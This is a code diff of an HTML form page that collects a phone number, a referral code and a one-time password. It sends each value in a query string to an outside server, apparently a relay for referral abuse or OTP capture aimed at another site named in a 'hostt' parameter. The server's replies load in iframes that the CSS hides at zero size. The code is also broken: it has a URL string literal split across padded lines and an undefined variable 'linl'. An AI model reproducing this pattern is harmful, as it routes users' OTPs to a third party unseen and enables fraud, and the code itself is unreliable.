@@ -4,30 +4,120 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Phone Number and Referral Code Form</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+    }
+
+    #myForm {
+        max-width: 400px;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+        font-weight: bold;
+        margin-bottom: 5px;
+        display: block;
+    }
+
+    input[type="tel"],
+    input[type="text"],
+    input[type="number"] {
+        width: calc(100% - 22px);
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+
+    button {
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    button:hover {
+        background-color: #0056b3;
+    }
+
+    #resultFrame, #resultFramet {
+        width: 0%;
+        min-height: 0px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+        margin-top: 20px;
+        resize: both;
+        overflow: auto;
+    }
+</style>
 </head>
 <body>
 
 <form id="myForm">
-  <label for="phoneNumber">Phone Number:</label><br>
-  <input type="tel" id="phoneNumber" name="phoneNumber" required><br>
-  <label for="referralCode">Referral Code:</label><br>
-  <input type="text" id="referralCode" name="referralCode"><br><br>
-  <button type="button" onclick="openInFrame()">Submit</button>
+    <label for="phoneNumber">Phone Number:</label>
+    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+    <label for="referralCode">Referral Code:</label>
+    <input type="text" id="referralCode" name="referralCode">
+    <button type="button" onclick="openInFrame()">GET OTP</button>
+
+    <label for="otp">Enter OTP:</label>
+    <input type="number" id="otp" name="otp">
+    <button type="button" onclick="openInFramet()">SUBMIT</button>
 </form>
 
-<iframe id="resultFrame" style="width: 300px; height: 200px; border: 1px solid #ccc;" scrolling="no"></iframe>
+<iframe id="resultFrame" scrolling="no"></iframe>
+<iframe id="resultFramet" scrolling="no"></iframe>
 
 <script>
-function openInFrame() {
-  var phoneNumber = document.getElementById("phoneNumber").value;
-  var referralCode = document.getElementById("referralCode").value;
+    var link = "
+  
+  
+  
+  
+  https://arshzz1.serv00.net/usgillam/
+  
+  
+  
+  
+  ";
+  
+  
+  
+  
+    function openInFrame() {
+        var phoneNumber = document.getElementById("phoneNumber").value;
+        var referralCode = document.getElementById("referralCode").value;
 
-  // Construct the URL with dynamic values
-  var url = "https://arshzz1.serv00.net/diaoachi/?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&submit=";
+        // Construct the URL with dynamic values
+        var url = link + "?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&submit=";
 
-  // Set the iframe src attribute to the constructed URL
-  document.getElementById("resultFrame").src = url;
-}
+        // Set the iframe src attribute to the constructed URL
+        document.getElementById("resultFrame").src = url;
+    }
+  
+    function openInFramet() {
+        var phoneNumber = document.getElementById("phoneNumber").value;
+        var referralCode = document.getElementById("referralCode").value;
+        var otp = document.getElementById("otp").value;
+
+        // Construct the URL with dynamic values
+        var url = linl + "otp.php?mobile=" + encodeURIComponent(phoneNumber) + "&refer=" + encodeURIComponent(referralCode) + "&otp=" + encodeURIComponent(otp) + "&hostt=www.usgillam.com&submit=";
+
+        // Set the iframe src attribute to the constructed URL
+        document.getElementById("resultFramet").src = url;
+    }
 </script>
 
 </body>
